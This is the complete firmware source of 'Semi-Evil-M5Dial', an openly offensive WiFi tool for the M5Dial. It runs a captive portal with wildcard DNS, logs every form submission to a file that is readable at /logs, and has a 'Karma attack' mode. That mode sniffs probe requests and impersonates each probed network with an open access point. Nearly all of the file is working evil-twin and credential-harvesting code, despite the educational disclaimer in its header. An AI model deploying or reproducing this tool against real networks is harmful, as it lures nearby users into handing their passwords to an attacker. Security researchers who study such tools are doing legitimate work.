/*
   Semi-Evil-M5Dial - WiFi Network Testing and Exploration Tool

   Copyright (c) 2024 7h30th3r0n3

   Permission is hereby granted, free of charge, to any person obtaining a copy
   of this software and associated documentation files (the "Software"), to deal
   in the Software without restriction, including without limitation the rights
   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
   copies of the Software, and to permit persons to whom the Software is
   furnished to do so, subject to the following conditions:

   The above copyright notice and this permission notice shall be included in all
   copies or substantial portions of the Software.

   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
   SOFTWARE.

   Disclaimer:
   This tool, Semi-Evil-M5Dial, is developed for educational and ethical testing purposes only. 
   Any misuse or illegal use of this tool is strictly prohibited. The creator of Semi-Evil-M5Dial 
   assumes no liability and is not responsible for any misuse or damage caused by this tool. 
   Users are required to comply with all applicable laws and regulations in their jurisdiction 
   regarding network testing and ethical hacking.
*/
#include <SPIFFS.h>
#include "M5Dial.h"
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <vector>
#include <ArduinoJson.h>
#include <string>
#include <esp_wifi.h>
#include <esp_system.h>

WebServer server(80);
DNSServer dnsServer;

const byte DNS_PORT = 53;
String ssid = "Semi-Evil-M5Dial";
const char* password = "";

const char* menuItems[] = {"Start Portal", "Saved SSID", "Start Karma", "About"};
const int menuItemsCount = sizeof(menuItems) / sizeof(menuItems[0]);

std::vector<String> ssidList;
std::vector<std::string> whitelist = {"neighbours-box", "7h30th3r0n3", "Evil-M5Core2"};
int currentIndex = 0;
long oldPosition = -999;
bool isPortalRunning = false;
unsigned long lastPressTime = 0;
const unsigned long doublePressThreshold = 500;

const int encoderMoveThreshold = 4;

enum ScreenState { MENU_SCREEN, PORTAL_SCREEN, KARMA_SCREEN, ABOUT_SCREEN };
ScreenState currentScreen = MENU_SCREEN;

bool isKarmaRunning = false;
bool isAutoKarmaActive = false;
bool newSSIDAvailable = false;
bool isAPDeploying = false;
char lastSSID[33] = {0};
char lastDeployedSSID[33] = {0};
unsigned long lastProbeDisplayUpdate = 0;
int probeDisplayState = 0;
const int autoKarmaAPDuration = 20000;
const int maxSSIDs = 100;

const float defaultTextSize = 0.4;
uint8_t display_rotation = 0;

enum DisplayState {
    DISPLAY_NONE,
    DISPLAY_WAITING_FOR_PROBE,
    DISPLAY_AP_STATUS
};

DisplayState currentDisplayState = DISPLAY_NONE;

void setup() {
    Serial.begin(115200);
    auto cfg = M5.config();
    M5Dial.begin(cfg, true, false);

    M5Dial.Display.setTextColor(WHITE);
    M5Dial.Display.setTextDatum(middle_center);
    M5Dial.Display.setTextFont(&fonts::Orbitron_Light_32);
    M5Dial.Display.setTextSize(defaultTextSize);

    if (!SPIFFS.begin(true)) {
        Serial.println("An Error has occurred while mounting SPIFFS");
        return;
    }

    const char* imagePath = "/EvilM5hub-240-135px.bmp";
    if (SPIFFS.exists(imagePath)) {
        Serial.println("Image file found, displaying image.");

        int16_t x_center1 = (M5.Display.width() - 240) / 2;
        int16_t y_center1 = (M5.Display.height() - 135) / 2;

        M5.Display.setRotation(display_rotation);
        M5.Display.clear();
        M5.Display.drawBmpFile(SPIFFS, imagePath, x_center1, y_center1);

        delay(5000);

        M5.Display.clear();
    } else {
        Serial.println("Image file not found, skipping image display.");
    }

    String selectedSSID = loadSelectedSSID();
    if (!selectedSSID.isEmpty()) {
        ssid = selectedSSID;
    }

    loadSSIDs();

    M5Dial.Display.fillScreen(BLACK);
    drawMenu(currentIndex);
}

void loop() {
    M5Dial.update();
    long newPosition = M5Dial.Encoder.read();

    switch (currentScreen) {
        case MENU_SCREEN:
            handleMenuNavigation(newPosition);
            break;
        case PORTAL_SCREEN:
            handlePortalScreen();
            break;
        case KARMA_SCREEN:
            loopAutoKarma();
            break;
        case ABOUT_SCREEN:
            if (M5Dial.BtnA.wasPressed()) {
                currentScreen = MENU_SCREEN;
                drawMenu(currentIndex);
            }
            break;
    }

    delay(10);
}

void displayAboutScreen() {
    M5Dial.Display.clear();
    drawRing(TFT_ORANGE);

    M5Dial.Display.setTextSize(defaultTextSize);
    M5Dial.Display.setTextColor(TFT_WHITE);

    int16_t yPos = 40;
    int16_t textWidth = M5Dial.Display.textWidth("Semi-Evil-M5Dial");
    int16_t xPos = (M5Dial.Display.width() - textWidth) / 2;
    M5Dial.Display.setCursor(xPos, yPos);
    M5Dial.Display.println("Semi-Evil-M5Dial");

    yPos += 30;
    textWidth = M5Dial.Display.textWidth("Version: 1.0.0");
    xPos = (M5Dial.Display.width() - textWidth) / 2;
    M5Dial.Display.setCursor(xPos, yPos);
    M5Dial.Display.println("Version: 1.0.0");

    yPos += 30;
    textWidth = M5Dial.Display.textWidth("By: 7h30th3r0n3");
    xPos = (M5Dial.Display.width() - textWidth) / 2;
    M5Dial.Display.setCursor(xPos, yPos);
    M5Dial.Display.println("By: 7h30th3r0n3");

    yPos += 30;
    textWidth = M5Dial.Display.textWidth("& dagnazty");
    xPos = (M5Dial.Display.width() - textWidth) / 2;
    M5Dial.Display.setCursor(xPos, yPos);
    M5Dial.Display.println("& dagnazty");

    yPos = M5Dial.Display.height() - 60;
    M5Dial.Display.setTextSize(0.4);
    textWidth = M5Dial.Display.textWidth("Press to return to menu");
    xPos = (M5Dial.Display.width() - textWidth) / 2;
    M5Dial.Display.setCursor(xPos, yPos);
    M5Dial.Display.println("Press to return to menu");
}

void loadSSIDs() {
    File file = SPIFFS.open("/SSID.json", "r");
    if (!file) {
        Serial.println("Failed to open SSID.json");
        return;
    }

    StaticJsonDocument<1024> doc;
    DeserializationError error = deserializeJson(doc, file);
    if (error) {
        Serial.println("Failed to parse JSON");
        return;
    }

    ssidList.clear();
    for (JsonVariant v : doc["ssids"].as<JsonArray>()) {
        String ssid = v.as<String>();
        ssidList.push_back(ssid);
        Serial.println("Loaded SSID: " + ssid);
    }

    file.close();
    Serial.println("Total SSIDs loaded: " + String(ssidList.size()));
}

void saveSSID(const String& newSSID) {
    for (const auto& ssid : ssidList) {
        if (ssid == newSSID) {
            Serial.println("SSID already exists in the list.");
            return;
        }
    }

    ssidList.push_back(newSSID);

    if (ssidList.size() > maxSSIDs) {
        ssidList.erase(ssidList.begin());
        Serial.println("Removed oldest SSID to maintain the limit.");
    }

    File file = SPIFFS.open("/SSID.json", "w");
    if (!file) {
        Serial.println("Failed to open SSID.json for writing");
        return;
    }

    StaticJsonDocument<1024> doc;
    JsonArray array = doc.createNestedArray("ssids");
    for (const auto& ssid : ssidList) {
        array.add(ssid);
    }

    if (serializeJson(doc, file) == 0) {
        Serial.println("Failed to write to file");
    }

    file.close();
    Serial.println("New SSID saved and list updated.");
}

void saveSelectedSSID(const String& selectedSSID) {
    File file = SPIFFS.open("/selectedSSID.json", "w");
    if (!file) {
        Serial.println("Failed to open selectedSSID.json for writing");
        return;
    }
    StaticJsonDocument<256> doc;
    doc["selectedSSID"] = selectedSSID;
    if (serializeJson(doc, file) == 0) {
        Serial.println("Failed to write selected SSID");
    }
    file.close();
    Serial.println("Selected SSID saved: " + selectedSSID);
}

String loadSelectedSSID() {
    File file = SPIFFS.open("/selectedSSID.json", "r");
    if (!file) {
        Serial.println("No selected SSID found, using default");
        return String("");
    }

    StaticJsonDocument<256> doc;
    DeserializationError error = deserializeJson(doc, file);
    if (error) {
        Serial.println("Failed to parse selected SSID");
        return String("");
    }

    String selectedSSID = doc["selectedSSID"].as<String>();
    file.close();
    Serial.println("Loaded selected SSID: " + selectedSSID);
    return selectedSSID;
}

void handleMenuNavigation(long newPosition) {
    if (abs(newPosition - oldPosition) >= encoderMoveThreshold) {
        M5Dial.Speaker.tone(8000, 20);
        oldPosition = newPosition;

        currentIndex = (newPosition / encoderMoveThreshold + menuItemsCount) % menuItemsCount;

        drawMenu(currentIndex);
    }

    if (M5Dial.BtnA.wasPressed()) {
        unsigned long currentTime = millis();
        if (currentTime - lastPressTime < doublePressThreshold) {
            if (isPortalRunning) {
                stopCaptivePortal();
            }
        } else {
            switch (currentIndex) {
                case 0:
                    if (!isPortalRunning) {
                        startCaptivePortal();
                    }
                    break;
                case 1:
                    if (!ssidList.empty()) {
                        selectSSID();
                    } else {
                        Serial.println("No SSIDs available");
                    }
                    break;
                case 2:
                    if (!isKarmaRunning) {
                        startAutoKarma();
                    }
                    break;
                case 3:
                    Serial.println("About selected");
                    currentScreen = ABOUT_SCREEN;
                    displayAboutScreen();
                    break;
            }
        }
        lastPressTime = currentTime;
    }
}

void handlePortalScreen() {
    if (isPortalRunning) {
        dnsServer.processNextRequest();
        server.handleClient();
        updateClientCount();
    }

    if (M5Dial.BtnA.wasPressed()) {
        stopCaptivePortal();
        currentScreen = MENU_SCREEN;
        drawMenu(currentIndex);
    }
}

void drawListMenu(const char* items[], int itemCount, int index, uint16_t highlightColor, uint16_t textColor, uint16_t ringColor) {
    M5Dial.Display.fillScreen(BLACK);
    drawRing(ringColor);

    const int itemHeight = 25;
    const int numVisibleItems = 3;

    for (int i = 0; i < numVisibleItems; i++) {
        int itemIndex = (index + i - 1 + itemCount) % itemCount;
        int yPos = (M5Dial.Display.height() / 2) + ((i - 1) * itemHeight);

        if (i == 1) {
            M5Dial.Display.setTextColor(highlightColor);
        } else {
            M5Dial.Display.setTextColor(textColor);
        }

        String displayText = String(items[itemIndex]);
        if (M5Dial.Display.textWidth(displayText) > M5Dial.Display.width() - 20) {
            displayText = displayText.substring(0, (M5Dial.Display.width() - 20) / M5Dial.Display.fontHeight()) + "...";
        }

        M5Dial.Display.setTextSize(defaultTextSize);
        M5Dial.Display.drawString(displayText, M5Dial.Display.width() / 2, yPos);
    }
}

void drawMenu(int index) {
    drawListMenu(menuItems, menuItemsCount, index, YELLOW, WHITE, YELLOW);
}

void drawSSIDMenu(int index) {
    const char* ssidArray[ssidList.size()];
    for (size_t i = 0; i < ssidList.size(); i++) {
        ssidArray[i] = ssidList[i].c_str();
    }

    drawListMenu(ssidArray, ssidList.size(), index, PURPLE, WHITE, PURPLE);
}

void drawRing(uint16_t color) {
    int16_t centerX = M5Dial.Display.width() / 2;
    int16_t centerY = M5Dial.Display.height() / 2;
    int16_t radius = min(M5Dial.Display.width(), M5Dial.Display.height()) / 2;

    for (int16_t r = radius; r > radius - 10; r--) {
        M5Dial.Display.drawCircle(centerX, centerY, r, color);
    }
}

void startCaptivePortal() {
    Serial.println("Starting Captive Portal...");

    WiFi.mode(WIFI_AP_STA);

    if (!WiFi.softAP(ssid.c_str(), password)) {
        Serial.println("Failed to start AP, retrying...");

        delay(500);
        WiFi.mode(WIFI_STA);
        delay(500);
        WiFi.mode(WIFI_AP_STA);

        if (!WiFi.softAP(ssid.c_str(), password)) {
            Serial.println("Failed to start AP after retry. Please check your configuration.");
            return;
        }
    }

    IPAddress myIP = WiFi.softAPIP();
    Serial.print("AP IP address: ");
    Serial.println(myIP);

    updateDisplayWithIP(myIP);

    dnsServer.start(DNS_PORT, "*", myIP);

    setupWebServerRoutes();

    server.begin();
    isPortalRunning = true;
    Serial.println("HTTP server started");

    currentScreen = PORTAL_SCREEN;
}

void stopCaptivePortal() {
    if (isPortalRunning) {
        server.close();
        dnsServer.stop();
        WiFi.softAPdisconnect(true);
        isPortalRunning = false;
        Serial.println("Captive portal stopped");

        WiFi.mode(WIFI_STA);
        delay(500);
    }
}

void updateDisplayWithIP(IPAddress myIP) {
    M5Dial.Display.clear();

    String connectText = "Connect to:";
    String ipText = myIP.toString() + "/logs";

    int16_t connectTextX = (M5Dial.Display.width() - M5Dial.Display.textWidth(connectText)) / 2;
    int16_t ipTextY1 = M5Dial.Display.height() / 2 - 40;
    M5Dial.Display.setCursor(connectTextX, ipTextY1);
    M5Dial.Display.println(connectText);

    int16_t ipTextX2 = (M5Dial.Display.width() - M5Dial.Display.textWidth(ipText)) / 2;
    int16_t ipTextY2 = ipTextY1 + 30;
    M5Dial.Display.setCursor(ipTextX2, ipTextY2);
    M5Dial.Display.println(ipText);

    drawRing(TFT_BLUE);
}

void updateClientCount() {
    int clientCount = WiFi.softAPgetStationNum();
    String clientsText = "Clients: " + String(clientCount);

    int16_t clientsTextX = (M5Dial.Display.width() - M5Dial.Display.textWidth(clientsText)) / 2;
    int16_t clientsTextY = M5Dial.Display.height() / 2 + 30;

    M5Dial.Display.fillRect(0, clientsTextY - 5, M5Dial.Display.width(), M5Dial.Display.fontHeight() + 10, TFT_BLACK);

    M5Dial.Display.setCursor(clientsTextX, clientsTextY);
    M5Dial.Display.setTextSize(defaultTextSize);
    M5Dial.Display.setTextColor(WHITE, BLACK);
    M5Dial.Display.println(clientsText);

    drawRing(TFT_BLUE);
}

void setupWebServerRoutes() {
    server.on("/", HTTP_GET, []() {
        File file = SPIFFS.open("/index.html", "r");
        if (!file) {
            Serial.println("File not found: /index.html");
            server.send(404, "text/plain", "File not found");
            return;
        }
        server.streamFile(file, "text/html");
        file.close();
    });

    server.on("/doge.html", HTTP_GET, []() {
        File file = SPIFFS.open("/doge.html", "r");
        if (!file) {
            Serial.println("File not found: /doge.html");
            server.send(404, "text/plain", "File not found");
            return;
        }
        server.streamFile(file, "text/html");
        file.close();
    });

    server.on("/submit", HTTP_POST, handleFormSubmit);

    server.on("/logs", HTTP_GET, []() {
        File logFile = SPIFFS.open("/log.txt", "r");
        if (logFile) {
            server.streamFile(logFile, "text/plain");
            logFile.close();
        } else {
            Serial.println("No logs found.");
            server.send(404, "text/plain", "No logs found.");
        }
    });

    server.onNotFound([]() {
        File file = SPIFFS.open("/index.html", "r");
        if (!file) {
            Serial.println("File not found: /index.html on NotFound");
            server.send(404, "text/plain", "File not found");
            return;
        }
        server.streamFile(file, "text/html");
        file.close();
    });
}

void handleFormSubmit() {
    if (server.hasArg("plain")) {
        String body = server.arg("plain");
        logData(body);
        server.send(200, "application/json", "{\"status\":\"ok\"}");
    } else {
        server.send(400, "application/json", "{\"status\":\"fail\"}");
    }
}

void logData(String data) {
    File logFile = SPIFFS.open("/log.txt", FILE_APPEND);
    if (logFile) {
        logFile.println(data);
        logFile.close();
        Serial.println("Data logged.");
    } else {
        Serial.println("Failed to open log file.");
    }
}

String cleanSSID(String ssid) {
    ssid.trim();
    ssid.remove(ssid.indexOf('\r'));
    ssid.remove(ssid.indexOf('\n'));
    return ssid;
}

void selectSSID() {
    currentScreen = ScreenState::PORTAL_SCREEN;

    delay(200);

    if (ssidList.empty()) {
        Serial.println("No SSIDs available");
        returnToMainMenu();
        return;
    }

    int ssidIndex = 0;
    long ssidOldPosition = -999;
    unsigned long lastPressTime = 0;

    while (true) {
        M5Dial.update();
        long newPosition = M5Dial.Encoder.read();

        if (abs(newPosition - ssidOldPosition) >= encoderMoveThreshold) {
            M5Dial.Speaker.tone(8000, 20);
            ssidOldPosition = newPosition;

            ssidIndex = (newPosition / encoderMoveThreshold + ssidList.size()) % ssidList.size();

            drawSSIDMenu(ssidIndex);
        }

        if (M5Dial.BtnA.wasPressed()) {
            unsigned long currentTime = millis();

            if (currentTime - lastPressTime < doublePressThreshold) {
                Serial.println("SSID selection canceled.");
                returnToMainMenu();
                break;
            } else {
                lastPressTime = currentTime;
                String selectedSSID = cleanSSID(ssidList[ssidIndex]);
                Serial.print("SSID selected: ");
                Serial.println(selectedSSID);

                ssid = selectedSSID;
                if (!WiFi.softAP(ssid.c_str(), password)) {
                    Serial.println("Failed to set SoftAP SSID.");
                } else {
                    Serial.println("SoftAP SSID set to: " + ssid);
                }

                saveSelectedSSID(ssid);

                Serial.println("Rebooting to apply SSID change...");
                delay(500);
                esp_restart();
            }
        }

        delay(10);
    }
}

void returnToMainMenu() {
    drawMenu(currentIndex);
    currentScreen = MENU_SCREEN;
    lastPressTime = 0;
    ssid = "";
}

void startAutoKarma() {
    if (isKarmaRunning) {
        Serial.println("Cannot start Karma attack, it's already running.");
        return;
    }

    isAutoKarmaActive = true;
    isKarmaRunning = true;
    currentScreen = KARMA_SCREEN;

    M5Dial.Display.clear();
    M5Dial.Display.setTextSize(defaultTextSize);
    M5Dial.Display.setTextColor(TFT_WHITE);
    int16_t startTextX = (M5Dial.Display.width() - M5Dial.Display.textWidth("Starting Karma Attack...")) / 2;
    int16_t startTextY = M5Dial.Display.height() / 2 - 10;
    M5Dial.Display.setCursor(startTextX, startTextY);
    M5Dial.Display.println("Starting Karma Attack...");

    Serial.println("Karma Auto Attack Started...");

    WiFi.disconnect(true);
    WiFi.mode(WIFI_AP_STA);

    esp_err_t wifi_start_err = esp_wifi_start();
    if (wifi_start_err != ESP_OK) {
        Serial.printf("Failed to start WiFi! Error code: 0x%x\n", wifi_start_err);
        isAutoKarmaActive = false;
        isKarmaRunning = false;
        return;
    }

    esp_err_t promisc_err = esp_wifi_set_promiscuous(true);
    if (promisc_err != ESP_OK) {
        Serial.printf("Failed to set promiscuous mode! Error code: 0x%x\n", promisc_err);
        isAutoKarmaActive = false;
        isKarmaRunning = false;
        return;
    }

    esp_wifi_set_promiscuous_rx_cb(&autoKarmaPacketSniffer);
}

void stopAutoKarma() {
    isAutoKarmaActive = false;
    isKarmaRunning = false;
    esp_wifi_set_promiscuous(false);
    Serial.println("Karma Auto Attack Stopped...");
    M5Dial.Display.clear();
    currentScreen = MENU_SCREEN;
    drawMenu(currentIndex);
}

void loopAutoKarma() {
    while (isAutoKarmaActive) {
        M5Dial.update();

        if (M5Dial.BtnA.wasPressed()) {
            stopAutoKarma();
            return;
        }

        if (newSSIDAvailable) {
            newSSIDAvailable = false;
            activateAPForAutoKarma(lastSSID);
        } else {
            if (millis() - lastProbeDisplayUpdate > 1000) {
                displayWaitingForProbe();
                lastProbeDisplayUpdate = millis();
            }
        }

        delay(100);
    }

    memset(lastSSID, 0, sizeof(lastSSID));
    newSSIDAvailable = false;
}

void autoKarmaPacketSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT || isAPDeploying) return;

    const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t *frame = packet->payload;
    const uint8_t frame_type = frame[0];

    if (frame_type == 0x40) {
        uint8_t ssid_length = frame[25];

        if (ssid_length == 0 || ssid_length > 32) return;

        char tempSSID[33];
        strncpy(tempSSID, (char*)&frame[26], ssid_length);
        tempSSID[ssid_length] = '\0';

        if (strcmp(tempSSID, lastSSID) == 0) return;

        strncpy(lastSSID, tempSSID, sizeof(lastSSID) - 1);
        newSSIDAvailable = true;
        Serial.printf("New SSID detected: %s\n", lastSSID);

        saveSSID(lastSSID);
    }
}

void activateAPForAutoKarma(const char* ssid) {
    if (isSSIDWhitelisted(ssid) || strcmp(ssid, lastDeployedSSID) == 0) return;

    isAPDeploying = true;

    if (!WiFi.softAP(ssid, password)) {
        Serial.println("Failed to start Karma AP");
        isAPDeploying = false;
        return;
    }

    strncpy(lastDeployedSSID, ssid, sizeof(lastDeployedSSID) - 1);

    unsigned long startTime = millis();
    while (millis() - startTime < autoKarmaAPDuration) {
        displayAPStatus(ssid, startTime, autoKarmaAPDuration);
        dnsServer.processNextRequest();
        server.handleClient();

        M5Dial.update();

        if (M5Dial.BtnA.wasPressed()) break;

        delay(100);
    }

    WiFi.softAPdisconnect(true);
    isAPDeploying = false;
}

bool isSSIDWhitelisted(const char* ssid) {
    for (const auto& wssid : whitelist) {
        if (wssid == ssid) return true;
    }
    return false;
}

void displayWaitingForProbe() {
    M5Dial.Display.fillScreen(TFT_BLACK);
    M5Dial.Display.setTextSize(defaultTextSize);
    M5Dial.Display.setTextColor(TFT_WHITE);

    int16_t waitingTextX = (M5Dial.Display.width() - M5Dial.Display.textWidth("Waiting for probe")) / 2;
    int16_t waitingTextY = M5Dial.Display.height() / 2 - 15;
    M5Dial.Display.setCursor(waitingTextX, waitingTextY);
    M5Dial.Display.print("Waiting for probe");

    unsigned long currentTime = millis();
    if (currentTime - lastProbeDisplayUpdate > 1000) {
        lastProbeDisplayUpdate = currentTime;
        probeDisplayState = (probeDisplayState + 1) % 4;

        int16_t dotsX = waitingTextX + M5Dial.Display.textWidth("Waiting for probe");
        int16_t dotsY = waitingTextY;

        M5Dial.Display.fillRect(dotsX, dotsY, M5Dial.Display.textWidth("..."), M5Dial.Display.fontHeight(), TFT_BLACK);
        M5Dial.Display.setCursor(dotsX, dotsY);
        for (int i = 0; i < probeDisplayState; i++) {
            M5Dial.Display.print(".");
        }
    }

    int16_t rectHeight = M5Dial.Display.height() / 4;
    M5Dial.Display.fillRect(0, M5Dial.Display.height() - rectHeight, M5Dial.Display.width(), rectHeight, TFT_RED);

    int16_t stopTextX = (M5Dial.Display.width() - M5Dial.Display.textWidth("Stop Auto")) / 2;
    int16_t stopTextY = M5Dial.Display.height() - rectHeight / 2 - M5Dial.Display.fontHeight() / 2;
    M5Dial.Display.setTextSize(defaultTextSize);
    M5Dial.Display.setTextColor(TFT_BLACK);
    M5Dial.Display.setCursor(stopTextX, stopTextY);
    M5Dial.Display.println("Stop Auto");
}

void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPDuration) {
    M5Dial.Display.clear();

    unsigned long currentTime = millis();
    int remainingTime = autoKarmaAPDuration / 1000 - ((currentTime - startTime) / 1000);

    M5Dial.Display.setTextSize(defaultTextSize);
    M5Dial.Display.setTextColor(TFT_WHITE);

    drawRing(TFT_RED);

    int16_t x = (M5Dial.Display.width() - M5Dial.Display.textWidth(ssid)) / 2;
    int16_t y = M5Dial.Display.height() / 4;
    M5Dial.Display.setCursor(x, y);
    M5Dial.Display.println(ssid);

    String timeText = "Time: " + String(remainingTime) + "s";
    x = (M5Dial.Display.width() - M5Dial.Display.textWidth(timeText)) / 2;
    y = M5Dial.Display.height() / 2;
    M5Dial.Display.setCursor(x, y);
    M5Dial.Display.println(timeText);

    String stopText = "Press to Stop";
    M5Dial.Display.setTextSize(defaultTextSize);
    int16_t stopTextX = (M5Dial.Display.width() - M5Dial.Display.textWidth(stopText)) / 2;
    int16_t stopTextY = M5Dial.Display.height() - 50;
    M5Dial.Display.setCursor(stopTextX, stopTextY);
    M5Dial.Display.println(stopText);
}
